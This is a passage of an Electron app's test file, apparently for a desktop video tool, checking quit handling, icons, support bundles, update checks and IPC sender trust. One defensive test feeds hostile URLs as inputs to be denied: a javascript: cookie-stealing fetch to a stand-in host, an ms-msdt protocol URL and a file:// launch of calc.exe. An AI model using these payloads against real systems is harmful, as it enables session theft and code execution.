    const window = electron.BrowserWindow.instances[0]!;
    const artifact = `${engineUrl}/projects/p1/artifacts/abc123?token=remote-token`;

    expect(window.navigateTo(artifact)).toBe(false);
    expect(window.downloads).toEqual([artifact]);
    expect(window.navigateTo(`http://127.0.0.1:${deadPort}/projects/p1/artifacts/abc123`)).toBe(false);
    expect(window.downloads).toEqual([artifact]);
  });

  it("holds the quit open until the engine tree is actually gone", async () => {
    // `engine.stop()` only sends SIGTERM; its SIGKILL backstop is an unref'd
    // timer, so an app that exits milliseconds later never fires it. An
    // engine that does not honour SIGTERM promptly (uvicorn's lifespan
    // shutdown outliving its socket) was left orphaned holding the data dir
    // and a few hundred MB of RSS until the next launch reclaimed the port.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    let releaseTeardown!: () => void;
    engineMock.teardown = new Promise<void>((resolve) => {
      releaseTeardown = resolve;
    });
    const quitsBefore = electron.quitCount();

    let prevented = false;
    electron.emitApp("before-quit", { preventDefault: () => (prevented = true) });

    expect(prevented).toBe(true);
    expect(engineMock.instance!.waited).toBe(1);
    // Still torn down, still not quit: the app is waiting on the engine.
    expect(electron.quitCount()).toBe(quitsBefore);

    releaseTeardown();
    await settle(() => electron.quitCount() > quitsBefore);
    expect(electron.quitCount()).toBe(quitsBefore + 1);
  });

  it("lets the second quit through instead of looping on itself", async () => {
    // The re-issued quit must not be intercepted again, or the app never exits.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    engineMock.teardown = null;

    electron.emitApp("before-quit", { preventDefault: () => {} });
    await settle(() => electron.quitCount() > 0);

    let preventedAgain = false;
    electron.emitApp("before-quit", { preventDefault: () => (preventedAgain = true) });
    expect(preventedAgain).toBe(false);
    expect(engineMock.instance!.waited).toBe(1); // not torn down twice
  });

  it("denies every window-open request", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(electron.BrowserWindow.instances[0]!.windowOpenHandler!({ url: "" })).toEqual({
      action: "deny",
    });
  });

  it("sends a web link to the browser rather than nowhere", async () => {
    // About's links row is the app's only <a target="_blank">, and denying
    // the open without handing the URL anywhere makes every one of them a
    // link that looks clickable and does nothing.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const open = electron.BrowserWindow.instances[0]!.windowOpenHandler!;
    open({ url: "https://github.com/echem-labs/local-cut-ai" });
    open({ url: "http://127.0.0.1:7830/docs" });
    expect(electron.openedExternally).toEqual([
      "https://github.com/echem-labs/local-cut-ai",
      "http://127.0.0.1:7830/docs",
    ]);
  });

  it("refuses to hand the OS anything that is not a web link", async () => {
    // openExternal launches whatever the OS has registered for the scheme.
    // The release feed supplies one of these URLs, so a feed that has been
    // tampered with must not be able to start a local program - and a
    // denied open with no openExternal call is the correct, inert outcome.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const open = electron.BrowserWindow.instances[0]!.windowOpenHandler!;
    for (const url of [
      "file:///C:/Windows/System32/calc.exe",
      "javascript:fetch('http://x/'+document.cookie)",
      "ms-msdt:/id PCWDiagnostic",
      "not a url at all",
      "",
    ]) {
      expect(open({ url })).toEqual({ action: "deny" });
    }
    expect(electron.openedExternally).toEqual([]);
  });

  it("quits instead of opening a second window", async () => {
    // Two instances means two engines on one data dir: two schedulers popping
    // the same queue rows, and two writers on project.json.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, lock: false });
    expect(electron.quitCount()).toBe(1);
    expect(electron.BrowserWindow.instances).toHaveLength(0);
  });

  it("focuses the existing window when a second instance starts", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;
    window.minimized = true;

    electron.emitApp("second-instance");
    expect(window.restored).toBe(true);
    expect(window.focused).toBe(true);
  });

  it("survives a renderer that fails to load", async () => {
    // A load failure (Vite not up yet, a packaging path slip) must not become
    // an unhandled rejection that leaves the app with no window at all.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    expect(electron.BrowserWindow.instances).toHaveLength(1);
    expect(electron.BrowserWindow.instances[0]!.loaded).toEqual([DEV_ORIGIN]);
  });
});

/**
 * The app icon at RUNTIME, which is a different question from the icon the
 * installer stamps on the exe.
 *
 * electron-builder covers two of the surfaces on its own — the Windows exe
 * resource and the macOS bundle — and nothing at all covers the rest: a Linux
 * window has no exe resource to read and an un-integrated AppImage has no
 * .desktop entry either, and no dev run on any platform has either of those.
 * Those cases showed Electron's default icon until the window started being
 * given one explicitly, so what these assert is that it still is, and that the
 * path it comes from is one that exists in the build being tested.
 */
describe("the app icon", () => {
  /**
   * What main.ts's own `path.join(__dirname, "..", "..", …)` comes out as.
   *
   * Shipped, main.js sits at dist-electron/electron/ and two levels up is
   * apps/desktop. Here it is the TypeScript in electron/ that runs, so the
   * same two levels land somewhere else entirely — which is why these tests
   * pin the relationship (two up from the main module, then the file) rather
   * than an absolute location. `ships the file` below covers the other half:
   * that the real path that relationship resolves to on disk exists.
   */
  const fromMain = (...parts: string[]) => path.join(__dirname, "..", "..", ...parts);

  it("gives the window an icon", async () => {
    const { electron } = await loadMain();
    const window = electron.BrowserWindow.instances[0]!;
    const icon = window.options.icon as { path: string } | undefined;
    expect(icon?.path).toBe(fromMain("public", "icon.png"));
  });

  it("reads it from the renderer bundle once packaged", async () => {
    // build/ is where the generator also writes, but electron-builder treats
    // that directory as build resources and leaves it OUT of the package —
    // so a packaged build reading from there finds nothing. public/ is copied
    // into dist/ by Vite and ships inside the asar.
    const { electron } = await loadMain({ packaged: true });
    const icon = electron.BrowserWindow.instances[0]!.options.icon as { path: string };
    expect(icon.path).toBe(fromMain("dist", "icon.png"));
  });

  it("ships the file those paths resolve to", () => {
    // The assertion the two above cannot make: that the name is not merely
    // well-formed but actually on disk. Checked at its real location —
    // dist/ is a build artifact, so only its source in public/ is there to
    // find in a bare checkout, and Vite copying public/ into dist/ is what
    // carries it the rest of the way.
    expect(fs.existsSync(path.join(__dirname, "..", "public", "icon.png"))).toBe(true);
  });

  it("puts the mark on a toast, which Linux has no other source for", async () => {
    // devUrl, because the notify handler only answers a sender it trusts and
    // the app's own origin is the dev server's in an unpackaged run.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    electron.BrowserWindow.instances[0]!.focused = false;

    const result = await electron.invokeIpc("shell:notify", senderStub(electron), {
      title: "Your video is ready",
      body: "",
    });

    expect(result).toEqual({ ok: true, shown: true, error: null });
    expect(electron.notifications[0]!.icon?.path).toBe(fromMain("public", "icon.png"));
  });

  it("sets the Dock icon in a dev run on macOS", async () => {
    // `electron .` has no bundle of its own to take one from.
    const { electron } = await loadMain({ dock: true });
    expect(electron.dockIcons.map((image) => image.path)).toEqual([
      fromMain("public", "icon.png"),
    ]);
  });

  it("leaves the Dock alone in a packaged macOS build", async () => {
    // There the bundle is authoritative, and overriding it with a PNG would
    // drop the inset .icns the packaging step went to the trouble of making.
    const { electron } = await loadMain({ packaged: true, dock: true });
    expect(electron.dockIcons).toEqual([]);
  });

  it("does not reach for a Dock that isn't there", async () => {
    // app.dock is undefined off macOS; main.ts keys on that rather than on
    // process.platform, so this is the assertion that the guard is real.
    const { electron } = await loadMain({ dock: false });
    expect(electron.dockIcons).toEqual([]);
  });

  it("claims the app's Windows identity before anything can show", async () => {
    // AppUserModelID is what the taskbar groups by, what a pinned shortcut
    // points at, and where a toast gets its icon and name. Set late, a window
    // or a notification can beat it.
    const { electron } = await loadMain();
    expect(electron.appUserModelIds).toEqual(["ai.localcut.desktop"]);
  });
});

/**
 * The rig's fresh-profile override. It runs at MODULE scope — before the
 * stores below it are constructed — so it cannot be exercised through
 * loadMain, which sets the packaging state after the import.
 *
 * The reason it is a shipped guard rather than a test-only trick: a packaged
 * build that relocated its profile on an environment variable would let
 * anything that can set the environment point a user's app at a profile it
 * controls.
 */
describe("the dev-only userData override", () => {
  async function loadWith(packaged: boolean, override: string | undefined) {
    vi.resetModules();
    const electron = await import("./test/electron-stub");
    electron.resetElectron();
    electron.state.userData = dir;
    electron.state.isPackaged = packaged;
    // No single-instance lock: the whenReady body quits early, so importing
    // main.ts here opens no window and starts no engine.
    electron.state.singleInstanceLock = false;
    if (override === undefined) delete process.env.LOCALCUT_USERDATA;
    else process.env.LOCALCUT_USERDATA = override;
    await import("./main");
    return electron;
  }

  const fresh = (): string => fs.mkdtempSync(path.join(os.tmpdir(), "localcut-override-"));

  afterEach(() => {
    delete process.env.LOCALCUT_USERDATA;
  });

  it("points userData at LOCALCUT_USERDATA in a dev run", async () => {
    const profile = fresh();
    const electron = await loadWith(false, profile);
    expect(electron.app.getPath("userData")).toBe(profile);
    fs.rmSync(profile, { recursive: true, force: true });
  });

  it("ignores it in a packaged build", async () => {
    const profile = fresh();
    const electron = await loadWith(true, profile);
    expect(electron.app.getPath("userData")).toBe(dir);
    fs.rmSync(profile, { recursive: true, force: true });
  });

  it("leaves the profile alone when the variable is unset", async () => {
    const electron = await loadWith(false, undefined);
    expect(electron.app.getPath("userData")).toBe(dir);
  });
});

describe("About → Support", () => {
  it("opens the app's own log folder and nothing the renderer names", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });

    // No argument is passed even though the renderer could send one — the
    // handler takes the directory from main's own state.
    const result = await electron.invokeIpc("support:open-logs", senderStub(electron), "/etc");

    expect(electron.openedPaths).toEqual([path.join(dir, "logs")]);
    expect(result).toEqual({ ok: true, error: null });
  });

  it("reports a folder the OS would not open", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    // openPath resolves with a reason rather than rejecting, so a handler
    // that only awaited it would report success on every failure.
    electron.shell.openPathFailure = "no application is registered";

    expect(await electron.invokeIpc("support:open-logs", senderStub(electron))).toEqual({
      ok: false,
      error: "no application is registered",
    });
  });

  it("writes a bundle carrying the logs, the versions and the system report", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const target = path.join(dir, "bundle.zip");
    electron.dialog.result = { canceled: false, filePath: target };
    console.log("[engine] a line worth keeping");

    const result = await electron.invokeIpc("support:export-bundle", senderStub(electron), {
      versions: { app: "0.1.0", engine: "0.1.0" },
      system: { backend_mode: "local" },
    });

    expect(result).toEqual({ path: target, error: null });
    const zip = fs.readFileSync(target);
    // Read the names out of the central directory rather than trusting the
    // writer: this asserts the file on disk, which is the artifact a user
    // would actually send.
    expect(zipNames(zip)).toEqual(["versions.json", "system.json", "logs/localcut.log"]);
  });

  it("treats a cancelled save as an outcome, not an error", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    electron.dialog.result = { canceled: true, filePath: "" };

    // null error, null path: About shows a message for every non-null
    // error it gets back, and there is nothing to apologize for here.
    expect(await electron.invokeIpc("support:export-bundle", senderStub(electron), {})).toEqual({
      path: null,
      error: null,
    });
  });

  it("refuses to write a report the renderer inflated", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const target = path.join(dir, "huge.zip");
    electron.dialog.result = { canceled: false, filePath: target };

    await electron.invokeIpc("support:export-bundle", senderStub(electron), {
      versions: { app: "0.1.0" },
      system: { padding: "x".repeat(512 * 1024) },
    });

    // The bundle is still written — the logs are the point of it — but the
    // oversized half is replaced by its own size rather than carried.
    const written = fs.readFileSync(target).toString("binary");
    expect(written).not.toContain("xxxxxxxxxx");
    expect(fs.statSync(target).size).toBeLessThan(64 * 1024);
  });
});

describe("About → the update check", () => {
  it("declines when no release feed was configured", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    // The default. The button is hidden in this state, so this is the
    // answer for anything that calls the channel anyway.
    expect(await electron.invokeIpc("update:check", senderStub(electron))).toEqual({
      latest: null,
      url: null,
      error: "updates are not configured",
    });
  });

  it("reads the version and link out of a GitHub release", async () => {
    const feed = await feedServing(200, { tag_name: "v0.2.0", html_url: "https://example/rel" });
    try {
      const { electron } = await loadMain({ devUrl: DEV_ORIGIN, feed: feed.url });
      expect(await electron.invokeIpc("update:check", senderStub(electron))).toEqual({
        latest: "0.2.0", // the leading v is the tag's, not the version's
        url: "https://example/rel",
        error: null,
      });
    } finally {
      await feed.close();
    }
  });

  it("reports a feed that answered with an error status", async () => {
    const feed = await feedServing(503, {});
    try {
      const { electron } = await loadMain({ devUrl: DEV_ORIGIN, feed: feed.url });
      expect(await electron.invokeIpc("update:check", senderStub(electron))).toEqual({
        latest: null,
        url: null,
        error: "HTTP 503",
      });
    } finally {
      await feed.close();
    }
  });

  it("reports a feed whose body says nothing about a version", async () => {
    const feed = await feedServing(200, { message: "Not Found" });
    try {
      const { electron } = await loadMain({ devUrl: DEV_ORIGIN, feed: feed.url });
      expect(await electron.invokeIpc("update:check", senderStub(electron))).toMatchObject({
        latest: null,
        error: "the release feed made no sense",
      });
    } finally {
      await feed.close();
    }
  });
});

describe("when the engine stops on its own", () => {
  it("tells the renderer, so the app does not just go quiet", async () => {
    // The renderer keeps its whole state when the engine dies: nothing it
    // can observe changes until the next request fails, and by then the
    // words on screen are about that request rather than the engine. So the
    // shell says it, once, on the channel the banner listens to.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const crash = { code: 1, signal: null, tail: ["[engine] boom"], at: "2026-08-09T00:00:00Z" };

    for (const listener of engineMock.instance!.crashListeners) listener(crash);

    const window = electron.BrowserWindow.instances[0]!;
    expect(window.sent).toEqual([{ channel: "engine:crashed", args: [crash] }]);
  });

  it("re-arms the stored provider keys against the engine it just started", async () => {
    // The engine holds BYOK keys in memory only, so a fresh child inherits
    // none of them. Every other path that (re)establishes a connection —
    // whenReady, unpair, pair — re-arms after it; without the same follow-up
    // here, a crash-restart leaves every cloud provider dead for the rest of
    // the session while Settings still reports the keys as configured.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN, keys: { anthropic: "sk-ant" } });
    const before = keyPuts().length;

    await electron.invokeIpc("engine:restart", trusted(DEV_ORIGIN));

    const puts = keyPuts().slice(before);
    expect(puts).toHaveLength(1);
    expect(JSON.parse(puts[0]!.body)).toMatchObject({ anthropic_key: "sk-ant" });
  });

  it("lets a trusted renderer start it again", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const before = engineMock.instance!.connection;
    engineMock.instance!.connection = null;

    const result = await electron.invokeIpc("engine:restart", trusted(DEV_ORIGIN));

    expect(result).toEqual({ ok: true, error: null });
    expect(engineMock.instance!.connection).toEqual(before);
  });
});

describe("the taskbar bar and the window title", () => {
  it("shows the renderer's own words, and does not invent its own", async () => {
    // The catalog is the renderer's; a second copy of "Rendering {done}/
    // {total}" in main is how the two come to disagree. Main places it.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;

    await electron.invokeIpc("window:set-progress", senderStub(electron), {
      fraction: 0.44,
      title: "Rendering 4/9 - A film about bees",
    });

    expect(window.progressBars.at(-1)).toBe(0.44);
    expect(window.titles.at(-1)).toBe("Rendering 4/9 - A film about bees");
  });

  it("takes the bar away rather than drawing an empty one", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;

    await electron.invokeIpc("window:set-progress", senderStub(electron), {
      fraction: -1,
      title: "",
    });

    // -1 is Electron's own sentinel for "no bar", and the title goes back to
    // the app's rather than to nothing at all.
    expect(window.progressBars.at(-1)).toBe(-1);
    expect(window.titles.at(-1)).toBe("LocalCut AI");
  });

  it("clamps what it is given instead of painting a bar stuck at the edge", async () => {
    // NaN is the one that matters: Electron draws it as a bar at 0 rather
    // than removing it, so a single bad tick would leave the taskbar
    // claiming a render forever.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;

    for (const fraction of [4, -9, Number.NaN, "half"]) {
      await electron.invokeIpc("window:set-progress", senderStub(electron), { fraction, title: "" });
    }

    // Every negative reads as "clear", not as "clamp up to an empty bar".
    expect(window.progressBars.slice(-4)).toEqual([1, -1, -1, -1]);
  });

  it("refuses an untrusted sender", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = electron.BrowserWindow.instances[0]!;
    const before = window.titles.length;

    const result = await electron.invokeIpc(
      "window:set-progress",
      trusted("https://evil.example/"),
      { fraction: 1, title: "Rendering 9/9 - anything at all" },
    );

    expect(result).toEqual({ ok: false, error: "untrusted sender" });
    expect(window.titles).toHaveLength(before);
  });
});

describe("telling the user a render finished", () => {
  /** The window main created — focused or not, minimised or not. A
   *  notification click has to restore before it focuses, so `minimized`
   *  and `restored` are part of what these tests read. */
  const windowOf = (electron: {
    BrowserWindow: { instances: { focused: boolean; minimized: boolean; restored: boolean }[] };
  }) => electron.BrowserWindow.instances[0]!;

  it("says so when the app is in the background", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    windowOf(electron).focused = false;

    const result = await electron.invokeIpc("shell:notify", senderStub(electron), {
      title: "Your video is ready",
      body: "A film about bees has finished rendering.",
    });

    expect(result).toEqual({ ok: true, shown: true, error: null });
    expect(electron.notifications).toMatchObject([
      {
        title: "Your video is ready",
        body: "A film about bees has finished rendering.",
        shown: true,
      },
    ]);
  });

  it("stays quiet when the user is already watching it", async () => {
    // A notification for something on screen is the app interrupting to
    // report what is already in front of you.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    windowOf(electron).focused = true;

    const result = await electron.invokeIpc("shell:notify", senderStub(electron), {
      title: "Your video is ready",
      body: "",
    });

    expect(result).toEqual({ ok: true, shown: false, error: null });
    expect(electron.notifications).toEqual([]);
  });

  it("does nothing at all where the OS has them switched off", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    windowOf(electron).focused = false;
    electron.notificationSupport.supported = false;

    const result = await electron.invokeIpc("shell:notify", senderStub(electron), {
      title: "Your video is ready",
      body: "",
    });

    expect(result).toEqual({ ok: true, shown: false, error: null });
    expect(electron.notifications).toEqual([]);
  });

  it("brings the window back when the notification is clicked", async () => {
    // The notice is about work the user asked for, so clicking it is a
    // request to return to that work. A minimised window has to be restored
    // first: focusing one that is minimised does nothing at all.
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    const window = windowOf(electron);
    window.focused = false;
    window.minimized = true;
    await electron.invokeIpc("shell:notify", senderStub(electron), { title: "Ready", body: "" });

    electron.notifications.at(-1)!.click();

    expect(window.restored).toBe(true);
    expect(window.focused).toBe(true);
  });

  it("refuses an untrusted sender", async () => {
    const { electron } = await loadMain({ devUrl: DEV_ORIGIN });
    windowOf(electron).focused = false;

    const result = await electron.invokeIpc("shell:notify", trusted("https://evil.example/"), {
      title: "Click here",
      body: "",
    });

    expect(result).toEqual({ ok: false, error: "untrusted sender" });
    expect(electron.notifications).toEqual([]);
  });
});
